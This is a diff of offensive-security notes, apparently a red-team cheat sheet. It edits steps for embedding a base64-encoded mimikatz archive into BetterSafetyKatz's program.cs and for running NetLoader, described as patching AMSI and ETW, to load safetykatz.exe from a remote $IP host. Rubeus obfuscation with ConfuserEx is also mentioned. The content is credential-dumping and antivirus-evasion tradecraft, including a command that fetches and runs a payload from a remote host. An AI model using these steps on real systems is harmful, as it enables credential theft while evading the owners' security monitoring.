@@ -67,7 +67,7 @@ __BetterSafetyKatz__
 $f = "mimikatz_trunk.zip"
 [convert]::ToBase64String([IO.File]::ReadAllBytes($f)) | clip
 ```
-- Modify "program.cs":
+- Modify "program.cs" of BetterSafetyKatz:
 	- Add a variable to store above base64 value
 	- Comment the code that downloads & accepts mimikatz file
 	- Add this after zipstream, `zipStream = Convert.FromBase64String(base64value)`
@@ -83,7 +83,7 @@ __ConfuserEx (Rubeus.exe)__
 __NetLoader__
 - Patches AMSI & ETW while executing
 ```powershell
-AssemblyLoad.exe $IP/Loader.exe -path $IP/safetykatz.exe
+NetLoader.exe -path $IP/safetykatz.exe
 ```
-- AssemblyLoader loads NetLoader which in turn loads safetykatz.exe
+
 
